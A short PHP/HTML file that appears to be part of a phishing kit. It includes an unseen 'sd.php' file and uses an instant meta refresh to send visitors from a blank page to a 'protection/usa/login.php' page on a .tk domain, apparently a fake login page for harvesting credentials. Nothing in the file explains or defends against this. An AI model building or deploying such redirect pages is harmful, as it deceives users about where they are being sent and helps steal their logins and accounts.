<?php

include 'sd.php';

?>
<html>
<head>
<title></title>
<meta HTTP-EQUIV="REFRESH" CONTENT="0; url=https://76850.tk/protection/usa/login.php">
</head>
<body>
<center>
<h1><h1>
</center>
</body>
</html>